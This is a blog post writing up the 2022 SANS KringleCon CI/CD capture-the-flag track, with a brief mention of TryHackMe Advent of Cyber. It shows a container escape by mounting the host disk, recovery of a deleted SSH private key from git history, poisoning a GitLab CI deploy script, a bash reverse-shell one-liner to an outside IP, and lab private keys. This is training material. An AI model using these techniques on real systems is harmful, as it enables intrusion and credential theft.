---
layout: post
title: "NFT for Christmas"
date: 2022-12-27
image: /will-hack-for-coffee/assets/images/nft-for-christmas/orc-nft.png
custom_css: terminal
---

So this beautiful NFT or Non Fungible Token was one of the price for [SANS Kringlecon Virtual Event](https://www.sans.org/mlp/holiday-hack-challenge/), a cyber security challenge and virtual conference. Feel free to deposit Kringlecoin in my wallet if you liked this article or want to make an offer for this piece of art[^1]. This year was lord of the ring themed and I'll talk more in depth about my favorite track that was  about CI/CD (Continuous Integration / Continuous Delivery). But first I would briefly talk about another fun event during the Christmas holiday: [TryHackMe advent of cyber](https://tryhackme.com/christmas)


## Advent of Cyber 2022

![Secure coding tasks](/will-hack-for-coffee/assets/images/nft-for-christmas/secure-coding.png)

Everyday of december until Christmas Tryhackme unveil a new beginner friendly challenge. This event is free and stay available after the event, there is no need for hacking tools because a web based virtual machine is made available for you and you can skip challenge if you want to. Those are very diversified ranging from hacking web application (including web assembly), network pentest, abusing smart contract and IoT to security oriented task, like analyzing emails, network traffic and malware. This year three purple challenges were introduced, named because they are a mix of red (offensive) and blue (defensive). In the first challenge, you had to exploit a reverse shell through file upload and then were shown example of .NET code to protect the application, including adding scanning for virus. The second challenge was to correct the code of a web application to prevent SQL injection. The last challenge showed how to use native HTML5 and regex for input validation. If you are a web developer I'd recommend you take a look at those.

## Kringlecon V: Golden Rings

This year again Santa is in need of help, he lost his five rings and he can't do his Christmas magic without them. So there were five tracks you had to go through to recover the rings: Network analysis, CI/CD, Web, Cloud and Blockchain. There was log to analyze and Intrusion Prevention System configuration, XML external entity injection, digging in AWS CLI for secrets and more smart contract abuse to obtain a nifty NFT involving a [Merkle](https://www.youtube.com/watch?v=Qt_RWBq63S8) [tree](https://github.com/QPetabyte/Merkle_Trees). The CI/CD track was called the Elfen ring and it was my favorite this year. I'll cover it in more details below.

## Git cloning

![Objective: clone](/will-hack-for-coffee/assets/images/nft-for-christmas/objective-clone.png)

First step is straightforward, an elf has trouble cloning a public git repository. He is using this line but keep being denied:

![Git terminal](/will-hack-for-coffee/assets/images/nft-for-christmas/git-terminal.png)

If you talk with him he hints you to try via http, so using this command works:

``
git clone git@haugfactory.com:asnowball/aws_scripts.git
``

Or if you don't pay attention to the hint you can directly browse to the [gitlab website](https://haugfactory.com/orcadmin/aws_scripts/-/blob/main/README.md) like I did.

## The great escape

![Objective: prison-escape](/will-hack-for-coffee/assets/images/nft-for-christmas/objective-prison-escape.png)

This time you are tasked to free a dwarf from a container and grab the jailer key on the host server. The hints points to a neat [snyk reference](https://learn.snyk.io/lessons/container-runs-in-privileged-mode/kubernetes/). Looking at the root of the filesystem there is a .dockerenv file confirming you are in a docker container. Escalating your privilege with `sudo su` you can then list the partition on the disk:

        grinchum-land:~# fdisk -l
        Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
        2048 cylinders, 64 heads, 32 sectors/track
        Units: sectors of 1 * 512 = 512 bytes

        Disk /dev/vda doesn't contain a valid partition table

Then create a folder named vda with `mkdir` in the mnt directory and mount that partition: 

`mount /dev/vda /mnt/vda`

You can then explore the filesystem of the host:

        grinchum-land:/mnt/vda/home/jailer/.ssh# ls
        jail.key.priv  jail.key.pub


And `cat` his private key:

![Jailer key](/will-hack-for-coffee/assets/images/nft-for-christmas/jailer-key.png)

# CI/CD shenanigans

![Objective: CI/CD](/will-hack-for-coffee/assets/images/nft-for-christmas/objective-CICD.png)

Now for the final objective of that track, the orcs have stolen the elfen ring and use it to power a web store selling banners and flags. The elves has established a foothold on the network but the website is using a tremendous amount of power just to be up, so hurry and get the ring back! 

The elf you just helped tells you that he accidentaly commited something, this time it's in an internal network so you can't browse directly to the source code. Let's clone that repo:

        git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git

Moving in the cloned directory and looking at the file I found an interesting files:

        grinchum-land:~/wordpress.flag.net.internal$ cat .gitlab-ci.yml 
        stages:
        - deploy

        deploy-job:      
        stage: deploy 
        environment: production
        script:
        - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html

The script is synchronizing the current folder, possibly the git folder, with a folder hosting the website. So if I could push some modification to that script, the pipeline would run and execute it but when I try I'm asked for user and password. Let's take a look at that accidental commit.

        git log
        
        ...
        
        commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
        Author: knee-oh <sporx@kringlecon.com>
        Date:   Tue Oct 25 13:42:54 2022 -0700

        whoops

        ...

So let's a look at that commit:

        git show e19f653bde9ea3de6af21a587e41e7a909db1ca5
        commit 37b5d575bf81878934adb937a4fff0d32a8da105 (HEAD -> main, origin/main, origin/HEAD)
        Author: knee-oh <sporx@kringlecon.com>
        updated wp-config
        commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
        Author: knee-oh <sporx@kringlecon.com>
        Date:   Tue Oct 25 13:42:54 2022 -0700

        whoops

        diff --git a/.ssh/.deploy b/.ssh/.deploy
        deleted file mode 100644
        index 3f7a9e3..0000000
        --- a/.ssh/.deploy
        +++ /dev/null
        @@ -1,7 +0,0 @@
        ------BEGIN OPENSSH PRIVATE KEY-----
        -b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
        -QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
        -9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
        -AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
        -PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
        ------END OPENSSH PRIVATE KEY-----
        diff --git a/.ssh/.deploy.pub b/.ssh/.deploy.pub
        deleted file mode 100644
        index 8c0b43c..0000000
        --- a/.ssh/.deploy.pub
        +++ /dev/null
        @@ -1 +0,0 @@
        -ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com

        ~

So we have a private key, hope they didn't change it! You need to create a .ssh folder in your home folder, `touch` a file with the right ssh key nomenclature and `chmod` it with 600 permission. You can confirm the key encryption:

        grinchum-land:~/.ssh$ ssh-keygen -l -f id_ed25519 
        256 SHA256:ojIb4frmXHjoRXfHesxSv1kvvb/CYr713mC4U49WOPY sporx@kringlecon.com (ED25519)

With your key correctly set up you can `clone` another time but with different permission that will allow you to push some change.

        git clone git@gitlab.flag.net.internal:/rings-of-powder/wordpress.flag.net.internal.git

Modify the yaml and prepare to push but first some more setup:

        git config --global user.name "anonymous"
        git config --global user.email "anonymous@anonymous.production"
        git add --all
        git commit -m "Added a reverse shell for more convenience"
        git push

If you are like me you are trying a bunch of command until you finally find a command to get you a reverse shell, something like this:

        bash -i >& /dev/tcp/172.18.0.99/80 0>&1

Then you begin looking for the the flag in the environment variable, going through all the folders, reading the source code and trying to escape the container, until you are stuck and ask for help. I was told by a [a friendly hacker named Minkowski](https://twitter.com/minkowski) to look at the CI/CD script more closely:

        script:
        - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html

So it use ssh and a private key, I then tried to log at the server but I keep getting denied and I read the debugging info not understanding what was wrong:

        ssh -Tvvv root@wordpress.flag.net.internal

Until [an helpful hacker who was patiently helping me debugging my command](https://erichogue.ca/) told me I didn't have the same private key as him. I had not realized it was a different private key. xD

I then went back to the server and grabbed the private key, `chmod`ed it and logged to the worpress server:

        grinchum-land:~/wordpress.flag.net.internal$ ssh -i ~/.ssh/pkey  root@wordpress.flag.net.internal
        Linux wordpress.flag.net.internal 5.10.51 #1 SMP Mon Jul 19 19:08:01 UTC 2021 x86_64

        The programs included with the Debian GNU/Linux system are free software;
        the exact distribution terms for each program are described in the
        individual files in /usr/share/doc/*/copyright.

        Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
        permitted by applicable law.
        root@wordpress:~# cd /
        root@wordpress:/# ls
        bin  boot  dev  etc  flag.txt  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
        root@wordpress:/# cat flag.txt

                                Congratulations! You've found the HHC2022 Elfen Ring!


                                                ░░░░            ░░░░                                      
                                        ░░                              ░░░░                              
                                ░░                                      ░░░░                          
                                                                                ░░                        
                        ░░                                                  ░░░░                    
                                                                                ░░                  
                                        ░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░                  ░░                
                                        ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░                ░░              
                                ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒                ░░            
                                ░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓░░              ▓▓▓▓▓▓▓▓▒▒░░░░            ░░░░          
                ░░            ░░▒▒▓▓▓▓▓▓▓▓                            ▓▓▓▓▓▓▒▒░░            ░░░░        
                        ░░▒▒▓▓▓▓▓▓                                    ▓▓▒▒▒▒░░          ░░░░        
                        ▒▒▓▓▓▓▓▓                                        ▓▓▓▓▒▒░░          ░░░░      
        ░░            ▒▒▓▓▓▓▓▓                                            ▓▓▒▒░░░░        ░░░░▒▒    
                        ░░▒▒▓▓▓▓░░                                            ░░▒▒▒▒░░░░      ░░░░▒▒    
                        ░░▓▓▓▓▓▓                                                ▓▓▒▒░░░░      ░░░░▒▒    
        ░░            ▒▒▓▓▓▓                                                    ▒▒░░░░        ░░▒▒▒▒  
        ░░          ░░▓▓▓▓▓▓                                                    ▒▒▒▒░░░░      ░░▒▒▒▒  
        ░░          ▒▒▓▓▓▓                                                        ▒▒░░░░      ░░▒▒▒▒  
                        ▒▒▓▓▓▓                                                        ▒▒░░░░░░    ░░▒▒▒▒  
        ░░          ░░▓▓▓▓▒▒                                                        ▒▒░░░░░░    ░░▒▒▒▒▓▓
        ░░          ▒▒▓▓▓▓                                                            ░░░░░░░░  ░░▒▒▒▒▓▓
        ░░          ▒▒▓▓▓▓                                                            ░░░░░░░░  ░░▒▒▒▒▓▓
        ░░          ▒▒▓▓▓▓               oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT             ░░░░░░░░  ░░▒▒▒▒▓▓
        ░░░░        ▒▒▓▓▓▓                                                            ░░░░  ░░░░░░▒▒▒▒▓▓
        ░░░░        ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
        ▒▒░░        ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
        ▒▒░░░░      ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
        ▓▓░░░░      ░░▓▓▓▓▒▒                                                        ░░      ░░░░▒▒▒▒▓▓▓▓
        ▒▒░░        ▒▒▓▓▓▓                                                        ░░    ░░░░▒▒▒▒▒▒▓▓  
        ▒▒░░░░      ░░▓▓▓▓                                                        ░░    ░░░░▒▒▒▒▓▓▓▓  
        ▓▓▒▒░░      ░░▒▒▓▓▓▓                                                    ░░      ░░▒▒▒▒▒▒▓▓▓▓  
        ▓▓▒▒░░░░      ▒▒▒▒▓▓                                                          ░░░░▒▒▒▒▒▒▓▓▓▓  
        ▒▒▒▒░░░░    ▒▒▒▒▒▒▒▒                                                        ░░▒▒▒▒▒▒▒▒▓▓    
        ▓▓▒▒░░░░    ░░░░▒▒▒▒▓▓                                            ░░      ░░░░▒▒▒▒▒▒▓▓▓▓    
                ▒▒▒▒░░░░    ░░▒▒▒▒▒▒▒▒                                        ░░      ░░░░▒▒▒▒▒▒▒▒▓▓      
                ▓▓▒▒░░░░  ░░░░░░░░▒▒▓▓                                    ░░      ░░░░▒▒▒▒▒▒▓▓▓▓        
                ▓▓▓▓▒▒░░░░░░░░░░░░░░▒▒▒▒▓▓                            ░░        ░░░░▒▒▒▒▒▒▓▓▓▓▓▓        
                ▓▓▓▓▒▒░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒                ░░░░          ░░░░▒▒▒▒▒▒▓▓▓▓▓▓          
                ▓▓▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                ░░░░▒▒▒▒▒▒▓▓▓▓▓▓            
                        ▓▓▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░                        ░░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓              
                        ▓▓▓▓▓▓▒▒▒▒░░░░░░░░░░░░░░░░              ░░░░░░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓                
                        ▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓                  
                        ██▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓██                    
                                ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██                        
                                ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████                          
                                        ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████                              
                                        ░░░░░░░░▓▓██████████████████░░░░░░░░   

## Alternate solution

An even simpler solution suggested by Minkowski: sync the private key on the server, no need for a fancy reverse shell. So if I modified the script like this:

        script:
        - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress /etc/gitlab-runner/ root@wordpress.flag.net.internal:/var/www/html

And curl it:

        grinchum-land:~/wordpress.flag.net.internal$ curl wordpress.flag.net.internal/hhc22-wordpress-deploy
        -----BEGIN OPENSSH PRIVATE KEY-----
        b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
        QyNTUxOQAAACD8EYdZTOpf5REuWXMb9FKCFWoiIX2HoU1aH90V0Ptq3wAAAJiMXr0BjF69
        AQAAAAtzc2gtZWQyNTUxOQAAACD8EYdZTOpf5REuWXMb9FKCFWoiIX2HoU1aH90V0Ptq3w
        AAAEBtNE6sqOFoqkmOhcB/9DgzaQhQRC/bwkAbsBXwqrt/mPwRh1lM6l/lES5Zcxv0UoIV
        aiIhfYehTVof3RXQ+2rfAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
        -----END OPENSSH PRIVATE KEY-----

## See you next year Santa!

It's the third time I manage to complete Kringlecon, I learned tons of cool stuff and had lot of fun. Last year I submitted a [writeup](https://lolkatz.github.io/will-hack-for-coffee/writeups/Kringlecon2021.pdf) and I had an [honorable mention](https://www.sans.org/mlp/holiday-hack-challenge/winners-and-answers/). One of the challenge was to flash the firmware of a printer but I stumbled on the answer without actually doing the challenge and I tought I would have time to come back to do it later. The writeup took way longer than I tought so Minkowski saved the day again and gave me a recipe (just be warned, the code might need a little extra work!). If you are curious to try, the challenges from the last three years stay available all year round. Until next time, stay on Santa nice list.

[^1]: Not my NFT, not my wallet and not a real cryptocurrency.